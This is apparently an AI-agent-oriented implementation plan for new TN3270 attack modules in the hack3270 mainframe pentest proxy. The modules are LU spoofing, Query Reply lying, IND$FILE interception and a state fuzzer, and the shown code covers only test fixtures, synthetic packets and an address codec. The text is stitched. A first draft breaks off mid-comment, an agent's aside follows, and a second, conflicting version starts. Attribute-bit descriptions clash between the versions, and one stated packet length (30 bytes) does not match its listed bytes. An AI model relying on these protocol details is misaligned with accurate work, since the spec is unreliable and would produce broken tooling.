# Phase 3 — hack3270 New Attacks Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use `superpowers:subagent-driven-development` (recommended) or `superpowers:executing-plans`. Steps use checkbox (`- [ ]`) syntax.

**Goal:** Five novel attack modules for hack3270 that no existing tn3270 tool implements: a clean state-machine parser, ESM passive fingerprinting, LU-name spoofing, Query Reply lying + IND\$FILE intercept, and a pseudo-conversational state fuzzer. All exposed via MCP tools first, GUI tabs second.

**Architecture:** New code lives in `hack3270_libs/tn3270_v2.py` and `hack3270_libs/attacks/`. Depends on `hackterm-core` (Phase 0 — done) and `hack3270_libs/` extraction shims (Phase 1 — assumed done before this phase runs). Coexists with legacy `manipulate()`; nothing in legacy code is touched.

**Tech Stack:** Python 3.11+, `pytest`. Runtime deps: `hackterm-core` (already installed editable). No new pip deps.

**Spec reference:** `/home/kali/hack3270-update/docs/superpowers/specs/2026-04-07-hackterm-design.md` §3.1–§3.5, §5 Phase 3, §6

**Pytest binary:** `/home/kali/hack3270-update/.venv/bin/pytest`

---

## File Structure

```
hack3270_libs/
  tn3270_v2.py              # Task 1 — TN3270 class implementing Protocol (~600 LOC)
  attacks/
    __init__.py             # Task 0
    esm_passive.py          # Task 2 — ESMFingerprinter (~150 LOC)
    negotiation.py          # Task 3 — LUSpoofer (~250 LOC)
    structured.py           # Tasks 4+5 — QueryReplyLiar + IndFileInterceptor (~500 LOC)
    state_fuzz.py           # Tasks 6+7+8 — StateFuzzer (~700 LOC)
  mcp_tools.py              # Task 10 — register handlers on ApiServer (~200 LOC)

tests/
  __init__.py               # Task 0
  conftest.py               # Task 0 — fixtures: tn3270, fake_daemon, golden()
  golden/                   # Task 1 — synthetic .bin datastreams
    simple_sf.bin
    sba_positioned.bin
    hidden_field.bin
    tn3270e_wrapped.bin
    sfe_extended.bin
    iac_escaped.bin
    multi_field.bin
    ra_repeat.bin
  test_tn3270_v2.py         # Task 1
  test_esm_passive.py       # Task 2
  test_negotiation.py       # Task 3
  test_structured.py        # Tasks 4+5
  test_state_fuzz.py        # Tasks 6+7+8
  test_mcp_tools.py         # Task 10

injections/
  lu-names.txt              # Task 9 — ~500 entry seed wordlist
```

**Reference parsers** (read, do not modify):

| Source | What it does well | What it does badly |
|---|---|---|
| `hack3270_libs/hack3270_api.py:816-957` (`parse_screen_fields`) | Cleanest of the 4. SF/SFE/MF/SA/RA/IC/PT/GE/EUA all handled. ADDR_TABLE for 12-bit decode. | No WCC tracking. No IAC un-escaping. No TN3270E header. No rendered grid. Returns dicts, not `Field`. |
| `hack3270_libs/hack3270_api.py:776-810` (buffer addr codec) | Correct 12/14-bit decode/encode. ADDR_TABLE matches GA23-0059 Fig 4-2. | Lift verbatim. |
| `hack3270_libs/libhack3270.py` (`manipulate()`) | Battle-tested mutate logic. | Don't read it — Phase 1 wraps it. We do mutate from scratch. |

---

## Task 0: Test scaffold + attacks package

**Files:**
- Create: `hack3270_libs/attacks/__init__.py`
- Create: `tests/__init__.py`
- Create: `tests/conftest.py`
- Create: `tests/golden/` (directory)
- Create: `pytest.ini` (repo root)

- [ ] **Step 1: Create directories**

```bash
mkdir -p hack3270_libs/attacks tests/golden
```

- [ ] **Step 2: Create empty package markers**

Create `hack3270_libs/attacks/__init__.py`:

```python
"""
Attack modules for hack3270.

Each module exposes one class that hooks into ProxyDaemon via
add_observer() or set_client_intercept(). All depend on the
TN3270 protocol implementation in hack3270_libs.tn3270_v2.
"""
```

Create `tests/__init__.py` (empty).

- [ ] **Step 3: Write `pytest.ini` at repo root**

So `tests/` can import `hack3270_libs` without sys.path hacks.

Create `pytest.ini`:

```ini
[pytest]
testpaths = tests
pythonpath = .
```

- [ ] **Step 4: Write `conftest.py` with shared fixtures**

Create `tests/conftest.py`:

```python
"""
Shared fixtures for Phase 3 attack-module tests.

Two key abstractions:
  - golden(name): load a synthetic .bin packet from tests/golden/
  - fake_daemon: a ProxyDaemon stand-in that records inject_to_*
    calls and lets tests fire observers manually. Real ProxyDaemon
    needs sockets; attacks don't care about sockets, they care about
    the observer/intercept contract.
"""
import pytest
from pathlib import Path
from hackterm_core import EbcdicCodec, NegotiateOpts

GOLDEN_DIR = Path(__file__).parent / "golden"


@pytest.fixture
def golden():
    """Load a packet capture by name. golden('simple_sf') -> bytes."""
    def _load(name: str) -> bytes:
        return (GOLDEN_DIR / f"{name}.bin").read_bytes()
    return _load


@pytest.fixture
def codec():
    return EbcdicCodec("cp037")


class FakeDaemon:
    """ProxyDaemon stub. Same observer/intercept contract, no sockets.

    Test pattern:
        d = FakeDaemon()
        attack = SomeAttack(protocol, d)   # registers observer
        d.fire_s2c(packet_bytes)           # observer sees it
        assert attack.findings == {...}
    """
    def __init__(self):
        self._observers = []
        self._client_intercept = None
        self.negotiate_opts = NegotiateOpts()
        self.handshake_complete = True
        self.injected_to_server = []
        self.injected_to_client = []
        self.disconnect_count = 0

    def add_observer(self, fn):
        self._observers.append(fn)

    def set_client_intercept(self, fn):
        self._client_intercept = fn

    def inject_to_server(self, data):
        self.injected_to_server.append(data)

    def inject_to_client(self, data):
        self.injected_to_client.append(data)

    def disconnect_client(self):
        self.disconnect_count += 1

    # --- test driver helpers --------------------------------------
    def fire_s2c(self, data):
        """Simulate server->client traffic hitting observers."""
        for obs in self._observers:
            obs(data, "s2c")

    def fire_c2s(self, data):
        """Simulate client->server traffic. Returns what would be
        forwarded (None if intercept ate it)."""
        if self._client_intercept:
            data = self._client_intercept(data)
            if data is None:
                return None
        for obs in self._observers:
            obs(data, "c2s")
        return data


@pytest.fixture
def fake_daemon():
    return FakeDaemon()
```

- [ ] **Step 5: Verify scaffold imports**

```bash
/home/kali/hack3270-update/.venv/bin/pytest tests/ --collect-only
```

Expected: `collected 0 items` (no tests yet, but no import errors).

- [ ] **Step 6: Commit**

```bash
git add hack3270_libs/attacks/ tests/ pytest.ini
git commit -m "test(phase3): scaffold attacks package + test fixtures"
```

---

## Task 1: tn3270_v2 — clean state-machine parser

**Files:**
- Create: `hack3270_libs/tn3270_v2.py`
- Create: `tests/test_tn3270_v2.py`
- Create: `tests/golden/*.bin` (8 files)

The foundation. Implements `hackterm_core.Protocol` completely. ~600 LOC. Reference: `hack3270_libs/hack3270_api.py:816-957` for the order-walking skeleton, `:776-810` for the address codec.

Attribute byte layout (GA23-0059 §4.3.1):
```
bit 0-1: graphic-converter (always 11 for 12-bit; ignored)
bit 2:   protected         (0x20)
bit 3:   numeric           (0x10)
bit 4-5: display           (00=normal, 01=normal+pen, 10=intense, 11=nondisplay) → hidden when bits == 11 (0x0C)
bit 6:   reserved
bit 7:   MDT               (0x01)
```

- [ ] **Step 1: Generate golden-file synthetic packets**

Create `tests/make_golden.py` (run-once script, also serves as documentation of packet structure):

```python
#!/usr/bin/env python3
"""
Generate synthetic 3270 datastreams for golden-file testing.

Run once: python tests/make_golden.py
Re-run if you change the packet definitions below — tests will fail
loudly until you also update test_tn3270_v2.py expectations.

Byte references: GA23-0059 §4 (orders), §5 (structured fields).
"""
from pathlib import Path

OUT = Path(__file__).parent / "golden"
OUT.mkdir(exist_ok=True)

# --- Telnet layer -----------------------------------------------------
IAC_EOR = b"\xff\xef"   # IAC + End Of Record — terminates every record

# --- 3270 write commands ----------------------------------------------
EW       = b"\xf5"      # Erase/Write (clears buffer first)
WCC_KBD  = b"\xc3"      # WCC: bit6=reset MDT, bit1=keyboard restore

# --- 3270 orders ------------------------------------------------------
SF  = b"\x1d"           # Start Field — followed by 1 attr byte
SBA = b"\x11"           # Set Buffer Address — followed by 2 addr bytes
IC  = b"\x13"           # Insert Cursor — no args
RA  = b"\x3c"           # Repeat to Address — 2 addr bytes + 1 char

# --- EBCDIC text ------------------------------------------------------
ABC   = b"\xc1\xc2\xc3"             # "ABC"
HELLO = b"\xc8\xc5\xd3\xd3\xd6"     # "HELLO"
SPACE = b"\x40"

# ----------------------------------------------------------------------
# 1) simple_sf — minimal: EW + WCC + one protected field with "ABC"
#    Attr 0x60 = 01100000: bit2(protected)=1, all else default
# ----------------------------------------------------------------------
(OUT / "simple_sf.bin").write_bytes(
    EW + WCC_KBD + SF + b"\x60" + ABC + IAC_EOR
)

# ----------------------------------------------------------------------
# 2) sba_positioned — SBA to addr 0 (row 1 col 1) THEN SF
#    Addr encoding: 0x40 0x40 = ADDR_TABLE[0],ADDR_TABLE[0] = position 0
# ----------------------------------------------------------------------
(OUT / "sba_positioned.bin").write_bytes(
    EW + WCC_KBD + SBA + b"\x40\x40" + SF + b"\x60" + ABC + IAC_EOR
)

# ----------------------------------------------------------------------
# 3) hidden_field — SF with non-display attr
#    Attr 0x6c = 01101100: bit2(protected)=1, bits4-5=11(nondisplay)
#    Followed by an unprotected input field (attr 0x40 = MDT clear, unprot)
# ----------------------------------------------------------------------
(OUT / "hidden_field.bin").write_bytes(
    EW + WCC_KBD
    + SF + b"\x6c" + b"\xe2\xc5\xc3\xd9\xc5\xe3"   # protected hidden "SECRET"
    + SF + b"\x40" + SPACE * 8                      # unprotected, 8 spaces
    + IAC_EOR
)

# ----------------------------------------------------------------------
# 4) tn3270e_wrapped — same as simple_sf but with 5-byte TN3270E header
#    Header: data-type=0x00(3270-DATA), req-flag=0, resp-flag=0, seq=0x0000
# ----------------------------------------------------------------------
(OUT / "tn3270e_wrapped.bin").write_bytes(
    b"\x00\x00\x00\x00\x00"   # TN3270E header (seq=0)
    + EW + WCC_KBD + SF + b"\x60" + ABC + IAC_EOR
)

# ----------------------------------------------------------------------
# 5) sfe_extended — Start Field Extended with 2 attr pairs
#    SFE format: 0x29 <count> (<type><value>)*count
#    Pair 1: type 0xC0 (basic field attr) value 0x60 (protected)
#    Pair 2: type 0x42 (foreground color) value 0xF2 (red)
# ----------------------------------------------------------------------
(OUT / "sfe_extended.bin").write_bytes(
    EW + WCC_KBD
    + b"\x29\x02\xc0\x60\x42\xf2"   # SFE: 2 pairs, basic=protected, color=red
    + HELLO
    + IAC_EOR
)

# ----------------------------------------------------------------------
# 6) iac_escaped — text containing 0xFF (EBCDIC EO) escaped as IAC IAC
#    The byte 0xFF in cp037 decodes to a non-printable, but the point
#    is the parser must collapse FF FF -> FF before order-walking.
#    Without un-escaping, the second FF + EF looks like premature EOR.
# ----------------------------------------------------------------------
(OUT / "iac_escaped.bin").write_bytes(
    EW + WCC_KBD + SF + b"\x60"
    + b"\xc1\xff\xff\xc2"       # "A" + escaped-FF + "B" → 3 data bytes
    + IAC_EOR
)

# ----------------------------------------------------------------------
# 7) multi_field — 3 fields with SBAs between them, tests length calc
#    Field 1 at addr 0  : protected, "USER:"
#    Field 2 at addr 80 : unprotected, 8 underscores (input)
#    Field 3 at addr 160: protected, "PASS:"
# ----------------------------------------------------------------------
(OUT / "multi_field.bin").write_bytes(
    EW + WCC_KBD
    + SBA + b"\x40\x40" + SF + b"\x60" + b"\xe4\xe2\xc5\xd9\x7a"   # "USER:"
    + SBA + b"\xc1\x50" + SF + b"\x40" + b"\x6d" * 8                # 8x "_"
    + SBA + b"\xc2\x60" + SF + b"\x60" + b"\xd7\xc1\xe2\xe2\x7a"   # "PASS:"
    + IC                                                            # cursor here
    + IAC_EOR
)

# ----------------------------------------------------------------------
# 8) ra_repeat — Repeat to Address fills buffer with one char
#    RA <addr=10> <char='*'> → fill from current pos to addr 10 with *
#    Addr 10: high=(10>>6)&0x3F
I have everything needed to write the plan. Note: this is a read-only planning task — I cannot create the file or commit. I'll provide the complete plan content for the parent agent to save to `/home/kali/hack3270-update/docs/superpowers/plans/2026-04-07-phase3-hack3270-attacks.md` and commit.

---

# Phase 3 — hack3270 New Attacks Implementation Plan

```markdown
# Phase 3 — hack3270 New Attacks Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build five novel tn3270 attacks that no existing tool implements: a clean state-machine parser, ESM passive fingerprinting, LU-name spoofing, Query-Reply lying + IND$FILE interception, and a pseudo-conversational state fuzzer. Each ships as a module under `hack3270_libs/attacks/` exposed via MCP tool (GUI tabs follow in a later effort — MCP-first lets us test via Claude before building UI).

**Architecture:** All five attacks depend on `hack3270_libs/tn3270_v2.py` — a clean `Protocol` implementation that coexists with the legacy `manipulate()` codepath. Attacks hook into `ProxyDaemon` via the observer pattern (`add_observer()`, `set_client_intercept()`) established in Phase 0. No GUI dependencies in attack modules.

**Tech Stack:** Python 3.11+, `pytest`, `hackterm-core` (Phase 0 — already installed editable). No new external runtime deps.

**Dependencies:** Phase 0 complete (verified: `hackterm-core` 0.1.0 importable). Phase 1 (extraction) assumed complete before this phase runs — `daemon`, `daemon.negotiate_opts`, `daemon.add_observer()` are wired into the live hack3270 process.

**Spec reference:** `docs/superpowers/specs/2026-04-07-hackterm-design.md` §3, §5 Phase 3 table, §6 Testing Strategy

**Pytest invocation:** All test commands use `/home/kali/hack3270-update/.venv/bin/pytest` (the venv where `hackterm-core` is installed editable).

---

## File Structure

```
hack3270_libs/
  tn3270_v2.py             # Task 1 — clean state-machine parser, implements Protocol
  attacks/
    __init__.py            # Task 0
    esm_passive.py         # Task 2 — ESM fingerprinter (observer)
    negotiation.py         # Task 3 — LU-name spoofer (negotiate_hook)
    structured.py          # Tasks 4+5 — Query Reply liar + IND$FILE detector
    state_fuzz.py          # Tasks 6+7+8 — record/analyze/replay
  mcp_tools.py             # Task 10 — ApiServer handler registration

tests/
  __init__.py
  conftest.py              # tn3270 fixture, FakeDaemon, golden loader
  golden/
    simple_sf.bin          # EW + WCC + SF + "ABC" + IAC EOR
    sba_positioned.bin     # adds SBA before SF
    hidden_field.bin       # SF attr=0x6C (protected + non-display)
    tn3270e_wrapped.bin    # 5-byte TN3270E header prepended
    sfe_extended.bin       # SFE with attr-pair list
    iac_escaped.bin        # text containing 0xFF 0xFF (escaped IAC)
    multi_field.bin        # 3 fields, mixed protected/unprotected
    ra_repeat.bin          # Repeat-to-Address order
  test_tn3270_v2.py
  test_esm_passive.py
  test_negotiation.py
  test_structured.py
  test_state_fuzz.py
  test_mcp_tools.py

injections/
  lu-names.txt             # Task 9 — ~500 seed entries
```

**Reference parsers (read, don't copy):**

| File | Lines | What's good | What's broken |
|---|---|---|---|
| `hack3270_libs/hack3270_api.py` | 816-957 | Cleanest of the 4. Handles SF/SFE/SBA/SA/MF/RA/IC/PT/GE/EUA. Uses ADDR_TABLE. | No WCC tracking. No IAC escape. No TN3270E header. False-positives on 0x1D in text. |
| `hack3270_libs/hack3270_api.py` | 776-810 | `decode_buffer_address()` / `encode_buffer_address()` — 12-bit + 14-bit codec, lift directly | None — this is correct |
| `hack3270_libs/hack3270_api.py` | 59-68 | `ADDR_TABLE` — the 64-byte GA23-0059 translation table, copy verbatim | None |

---

## Task 0: Test scaffolding + golden files

**Files:**
- Create: `tests/__init__.py`
- Create: `tests/conftest.py`
- Create: `tests/golden/` (8 `.bin` files)
- Create: `hack3270_libs/attacks/__init__.py`

The golden files are **synthetic** — hand-crafted byte sequences, not live captures. This is a deliberate choice (spec §6 says "DVCA captures" but synthetic packets are deterministic, version-controllable, and don't need a mainframe to regenerate). Each `.bin` is documented inline in `conftest.py` so a future maintainer can regenerate it.

- [ ] **Step 1: Create directory skeleton**

```bash
mkdir -p tests/golden hack3270_libs/attacks
touch tests/__init__.py hack3270_libs/attacks/__init__.py
```

- [ ] **Step 2: Write `tests/conftest.py` with golden-file generator**

This conftest generates `.bin` files on first run (idempotent — skips if file exists). Generation lives next to the `gold()` fixture so the byte-meaning is documented where it's used.

Create `tests/conftest.py`:

```python
"""
Phase 3 test fixtures.

Golden files are SYNTHETIC — hand-crafted byte sequences documented
inline below. They are NOT live captures. The generator runs once
(idempotent) so the .bin files are git-tracked and tests don't need
a mainframe.

Byte legend (3270 datastream, GA23-0059):
  Write commands:  0xF5 = Erase/Write   0xF1 = Write   0x7E = EW Alternate
  WCC byte:        follows write cmd; 0xC3 = reset+unlock-keyboard+sound-alarm
  Orders:          0x1D=SF  0x29=SFE  0x11=SBA  0x13=IC  0x3C=RA
                   0x28=SA  0x2C=MF  0x12=EUA  0x05=PT  0x08=GE
  Telnet:          0xFF 0xEF = IAC EOR (end of record)
  TN3270E header:  5 bytes — data-type, req-flag, resp-flag, seq-num(2)

EBCDIC quick ref (cp037):
  0xC1-0xC9 = A-I    0xD1-0xD9 = J-R    0xE2-0xE9 = S-Z
  0xF0-0xF9 = 0-9    0x40 = space
"""
import pytest
import pathlib

GOLDEN_DIR = pathlib.Path(__file__).parent / "golden"

# ---------------------------------------------------------------------------
# Golden packet definitions — each is (filename, bytes, human description)
# ---------------------------------------------------------------------------

_GOLDENS = {
    # The minimal datastream: Erase/Write, WCC, one protected field, "ABC", EOR
    #   F5    Erase/Write command
    #   C3    WCC (reset MDT + unlock keyboard + sound alarm)
    #   1D 60 SF, attr=0x60 (bit6 + bit5=protected; normal display, alpha)
    #   C1 C2 C3   EBCDIC "ABC"
    #   FF EF IAC EOR
    "simple_sf.bin": bytes([
        0xF5, 0xC3,
        0x1D, 0x60,
        0xC1, 0xC2, 0xC3,
        0xFF, 0xEF,
    ]),

    # Same as simple_sf but with SBA positioning the buffer first.
    # SBA 0x40 0x40 → buffer address 0 (row 1, col 1) per ADDR_TABLE
    #   (ADDR_TABLE[0]=0x40 → high=0, low=0 → addr 0)
    "sba_positioned.bin": bytes([
        0xF5, 0xC3,
        0x11, 0x40, 0x40,        # SBA → position 0
        0x1D, 0x60,              # SF protected
        0xC1, 0xC2, 0xC3,        # "ABC"
        0xFF, 0xEF,
    ]),

    # Hidden (non-display) field. Attr 0x6C = 0110 1100:
    #   bit 6 (0x40) — graphic-escape pad bit (always set in valid attrs)
    #   bit 5 (0x20) — protected
    #   bits 3-2 (0x0C) — both set = non-display (hidden)
    "hidden_field.bin": bytes([
        0xF5, 0xC3,
        0x1D, 0x6C,              # SF: protected + hidden
        0xE2, 0xC5, 0xC3, 0xD9, 0xC5, 0xE3,  # "SECRET"
        0xFF, 0xEF,
    ]),

    # TN3270E-wrapped: 5-byte header before the datastream.
    # Header: data-type=0x00 (3270-DATA), req=0, resp=0, seq=0x0001
    "tn3270e_wrapped.bin": bytes([
        0x00, 0x00, 0x00, 0x00, 0x01,   # TN3270E header
        0xF5, 0xC3,
        0x1D, 0x60,
        0xC1, 0xC2, 0xC3,
        0xFF, 0xEF,
    ]),

    # Start Field Extended — attribute pairs instead of single attr byte.
    # SFE format: 0x29 <count> (<type> <value>)*count
    # Type 0xC0 = basic 3270 attr (same bits as SF attr byte)
    "sfe_extended.bin": bytes([
        0xF5, 0xC3,
        0x29, 0x02,              # SFE, 2 attribute pairs
        0xC0, 0x60,              #   pair 1: basic attr = protected
        0x42, 0xF4,              #   pair 2: foreground color = green (0xF4)
        0xC8, 0xC9,              # "HI"
        0xFF, 0xEF,
    ]),

    # IAC escaping: a data byte 0xFF must be doubled on the wire (0xFF 0xFF)
    # so it isn't confused with telnet IAC. The parser must un-escape this
    # back to a single 0xFF in the field content.
    # 0xFF in cp037 EBCDIC = 'Ÿ' (eo-superset codepoint) — rare but legal.
    "iac_escaped.bin": bytes([
        0xF5, 0xC3,
        0x1D, 0x40,              # SF: unprotected (attr=0x40, only bit6 set)
        0xC1, 0xFF, 0xFF, 0xC2,  # "A" + escaped-0xFF + "B" → content is C1 FF C2
        0xFF, 0xEF,
    ]),

    # Three fields on one screen — exercises field-length closure.
    # Field 1 at addr 0:   protected, "USER:"
    # Field 2 at addr 6:   unprotected (input), 8 blanks
    # Field 3 at addr 15:  protected, "PASS:"
    "multi_field.bin": bytes([
        0xF5, 0xC3,
        0x11, 0x40, 0x40,        # SBA → 0
        0x1D, 0x60,              # SF protected
        0xE4, 0xE2, 0xC5, 0xD9, 0x7A,  # "USER:"  (0x7A = ':')
        0x1D, 0x40,              # SF unprotected (input field)
        0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40,  # 8 spaces
        0x1D, 0x60,              # SF protected
        0xD7, 0xC1, 0xE2, 0xE2, 0x7A,  # "PASS:"
        0xFF, 0xEF,
    ]),

    # Repeat-to-Address: RA <addr:2> <char:1>
    # Fills from current position to <addr> with <char>.
    # RA to addr 10 (encode 10: high=0,low=10 → ADDR_TABLE[0]=0x40, ADDR_TABLE[10]=0x4A)
    # with EBCDIC '-' (0x60).
    "ra_repeat.bin": bytes([
        0xF5, 0xC3,
        0x11, 0x40, 0x40,        # SBA → 0
        0x3C, 0x40, 0x4A, 0x60,  # RA to addr 10, fill with '-'
        0xFF, 0xEF,
    ]),
}


def _materialize_goldens():
    """Write .bin files if they don't exist. Idempotent — safe to call always."""
    GOLDEN_DIR.mkdir(exist_ok=True)
    for name, data in _GOLDENS.items():
        path = GOLDEN_DIR / name
        if not path.exists():
            path.write_bytes(data)


_materialize_goldens()


@pytest.fixture
def gold():
    """Load a golden file by name: gold('simple_sf.bin') → bytes."""
    def _load(name: str) -> bytes:
        return (GOLDEN_DIR / name).read_bytes()
    return _load


# ---------------------------------------------------------------------------
# FakeDaemon — substitute for ProxyDaemon in attack-module tests.
# Records inject_to_server / inject_to_client calls. Lets tests fire
# observers and intercepts directly without sockets.
# ---------------------------------------------------------------------------

from hackterm_core.protocol import NegotiateOpts, MutateOpts


class FakeDaemon:
    """Drop-in for ProxyDaemon in unit tests. No sockets — pure in-memory."""

    def __init__(self):
        self.negotiate_opts = NegotiateOpts()
        self.mutate_opts = MutateOpts()
        self.handshake_complete = True
        self._observers = []
        self._client_intercept = None
        self.sent_to_server = []   # bytes injected via inject_to_server()
        self.sent_to_client = []   # bytes injected via inject_to_client()

    def add_observer(self, fn):
        self._observers.append(fn)

    def set_client_intercept(self, fn):
        self._client_intercept = fn

    def inject_to_server(self, data: bytes):
        self.sent_to_server.append(data)

    def inject_to_client(self, data: bytes):
        self.sent_to_client.append(data)

    # --- Test-driver helpers (NOT part of real ProxyDaemon API) ---

    def fire_s2c(self, data: bytes):
        """Simulate server→client traffic hitting observers."""
        for obs in self._observers:
            obs(data, "s2c")

    def fire_c2s(self, data: bytes):
        """Simulate client→server traffic hitting observers + intercept."""
        if self._client_intercept:
            data = self._client_intercept(data)
            if data is None:
                return None
        for obs in self._observers:
            obs(data, "c2s")
        return data


@pytest.fixture
def fake_daemon():
    return FakeDaemon()
```

- [ ] **Step 3: Materialize golden files**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/python -c "
import sys; sys.path.insert(0, 'tests')
import conftest
import pathlib
g = pathlib.Path('tests/golden')
for f in sorted(g.glob('*.bin')):
    print(f'{f.name}: {len(f.read_bytes())} bytes')
"
```

Expected output (8 files):
```
hidden_field.bin: 12 bytes
iac_escaped.bin: 10 bytes
multi_field.bin: 30 bytes
ra_repeat.bin: 11 bytes
sba_positioned.bin: 12 bytes
sfe_extended.bin: 12 bytes
simple_sf.bin: 9 bytes
tn3270e_wrapped.bin: 14 bytes
```

- [ ] **Step 4: Verify conftest loads under pytest**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/ --collect-only -q
```

Expected: `no tests ran` (no test files yet, but no import errors either).

- [ ] **Step 5: Commit**

```bash
git add tests/ hack3270_libs/attacks/__init__.py
git commit -m "test(phase3): scaffold tests dir + 8 synthetic golden packets"
```

---

## Task 1: tn3270_v2 — clean state-machine parser

**Files:**
- Create: `hack3270_libs/tn3270_v2.py`
- Create: `tests/test_tn3270_v2.py`

This is the foundation — every other attack imports `TN3270` from here. ~600 LOC. Implements the full `Protocol` ABC.

**What it does that the legacy parsers don't** (spec §3.1):
1. **WCC tracking** — knows where the datastream actually starts (after write-cmd + WCC), instead of guessing
2. **IAC un-escaping** — `0xFF 0xFF` → `0xFF` (telnet escape, RFC 854)
3. **SBA position tracking** — maintains current buffer address as it walks orders
4. **TN3270E header parsing** — reads the 5-byte header (RFC 2355) instead of detect-and-skip
5. **No false-positive on EBCDIC `]` (0x1D)** — treats 0x1D as SF only when in order context, not in text data. (The trick: after a write command, you're in *order context*. After an order that's followed by text, subsequent bytes are *data context* until the next SBA/SF/etc. The legacy `manipulate()` doesn't track this.)

**Reference:** `hack3270_libs/hack3270_api.py:816-957` is the cleanest existing parser. Lift the order-handling skeleton but add the state machine on top.

This task is split into 4 sub-passes (address codec → parser → mutator → builder) so each commit is independently testable.

### Sub-task 1a: Address codec + constants

- [ ] **Step 1: Write failing tests for address codec**

Create `tests/test_tn3270_v2.py`:

```python
"""
Tests for the clean tn3270 parser.

Golden-file driven: each test loads a synthetic .bin packet from
tests/golden/ and asserts the parsed Screen matches expectations.
"""
import pytest
from hackterm_core.protocol import Screen, Field, MutateOpts, FieldWrite, QueryLies


# ===========================================================================
# Sub-task 1a: address codec
# ===========================================================================

def test_addr_table_is_64_bytes():
    from hack3270_libs.tn3270_v2 import ADDR_TABLE
    assert len(ADDR_TABLE) == 64


def test_addr_table_position_0_is_0x40():
    """ADDR_TABLE[0] = 0x40 → encoding addr 0 gives bytes 40 40."""
    from hack3270_libs.tn3270_v2 import ADDR_TABLE
    assert ADDR_TABLE[0] == 0x40


def test_decode_addr_12bit_zero():
    """0x40 0x40 decodes to buffer position 0 (row 1, col 1)."""
    from hack3270_libs.tn3270_v2 import decode_addr
    assert decode_addr(0x40, 0x40) == 0


def test_decode_addr_12bit_position_80():
    """Position 80 (row 2, col 1 on 80-col screen).
    80 = (1 << 6) | 16 → ADDR_TABLE[1]=0xC1, ADDR_TABLE[16]=0x50."""
    from hack3270_libs.tn3270_v2 import decode_addr
    assert decode_addr(0xC1, 0x50) == 80


def test_decode_addr_14bit():
    """14-bit addressing: top 2 bits of b1 are 00.
    addr = ((b1 & 0x3F) << 8) | b2."""
    from hack3270_libs.tn3270_v2 import decode_addr
    # 0x01 0x50 → high bits 00, addr = (0x01 << 8) | 0x50 = 336
    assert decode_addr(0x01, 0x50) == 336


def test_encode_addr_12bit_roundtrip():
    from hack3270_libs.tn3270_v2 import encode_addr, decode_addr
    for pos in [0, 1, 79, 80, 1919]:  # 1919 = 24*80 - 1
        b1, b2 = encode_addr(pos)
        assert decode_addr(b1, b2) == pos


def test_encode_addr_returns_bytes():
    from hack3270_libs.tn3270_v2 import encode_addr
    result = encode_addr(0)
    assert isinstance(result, bytes)
    assert len(result) == 2


def test_addr_to_rowcol():
    """Convert linear buffer address to (row, col), 1-indexed."""
    from hack3270_libs.tn3270_v2 import addr_to_rowcol
    assert addr_to_rowcol(0, cols=80) == (1, 1)
    assert addr_to_rowcol(79, cols=80) == (1, 80)
    assert addr_to_rowcol(80, cols=80) == (2, 1)
    assert addr_to_rowcol(1919, cols=80) == (24, 80)


def test_rowcol_to_addr():
    from hack3270_libs.tn3270_v2 import rowcol_to_addr
    assert rowcol_to_addr(1, 1, cols=80) == 0
    assert rowcol_to_addr(2, 1, cols=80) == 80
    assert rowcol_to_addr(24, 80, cols=80) == 1919
```

- [ ] **Step 2: Run, verify failure**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_tn3270_v2.py -v
```

Expected: `ModuleNotFoundError: No module named 'hack3270_libs.tn3270_v2'`

- [ ] **Step 3: Implement address codec + constants**

Create `hack3270_libs/tn3270_v2.py`:

```python
"""
Clean tn3270 parser — state-machine implementation of Protocol.

Coexists with legacy manipulate() — used ONLY by Phase 3 attacks.
The legacy codepath stays untouched (Approach C, spec §1).

What this does that the four existing parsers don't:
  1. WCC tracking — knows where datastream starts (after cmd + WCC)
  2. IAC 0xFF 0xFF un-escaping (RFC 854 telnet escaping)
  3. SBA position tracking — maintains current buffer addr as it walks
  4. TN3270E header parsing (RFC 2355 §5) — 5-byte: type, req, resp, seq(2)
  5. Context-aware 0x1D — only SF in order context, not text context

Reference: GA23-0059 3270 Data Stream Programmer's Reference (Dec 1988).
Order definitions: §4.3. Write commands: §3.5. SF attribute bits: §4.3.1.

Cleanest existing parser to crib from: hack3270_api.py:816-957
(parse_screen_fields). The order skeleton there is correct; what's
missing is the state tracking and IAC handling.
"""
from dataclasses import dataclass
from typing import Optional

from hackterm_core.protocol import (
    Protocol, Screen, Field, FieldWrite, MutateOpts, NegotiateOpts,
    StructuredField, QueryLies,
)
from hackterm_core.ebcdic import EbcdicCodec

# ===========================================================================
# Constants — GA23-0059
# ===========================================================================

# --- Write commands (host → terminal, first byte of datastream) ---
# GA23-0059 Table 3-2. Two encodings: SNA (0x01-0x11) and non-SNA (0xF1-0xF7).
# We see the non-SNA values on the wire because TN3270 is non-SNA.
CMD_WRITE        = 0xF1   # also 0x01
CMD_ERASE_WRITE  = 0xF5   # also 0x05
CMD_EW_ALT       = 0x7E   # also 0x0D — Erase/Write Alternate (alt screen size)
CMD_WSF          = 0xF3   # also 0x11 — Write Structured Field
CMD_ERASE_ALL_UNPROT = 0x6F   # also 0x0F
CMD_READ_BUFFER  = 0xF2   # also 0x02
CMD_READ_MOD     = 0xF6   # also 0x06

# Commands that are followed by a WCC byte
_HAS_WCC = {0xF1, 0x01, 0xF5, 0x05, 0x7E, 0x0D}
# Commands that erase the screen first
_ERASES = {0xF5, 0x05, 0x7E, 0x0D}

# --- Orders (GA23-0059 §4.3) ---
ORD_SF   = 0x1D   # Start Field — 1 attr byte follows
ORD_SFE  = 0x29   # Start Field Extended — count + (type,value) pairs
ORD_SBA  = 0x11   # Set Buffer Address — 2 addr bytes follow
ORD_SA   = 0x28   # Set Attribute — 2 bytes (type, value) follow
ORD_MF   = 0x2C   # Modify Field — count + (type,value) pairs
ORD_IC   = 0x13   # Insert Cursor — 0 bytes follow
ORD_PT   = 0x05   # Program Tab — 0 bytes follow
ORD_RA   = 0x3C   # Repeat to Address — 2 addr bytes + 1 char follow
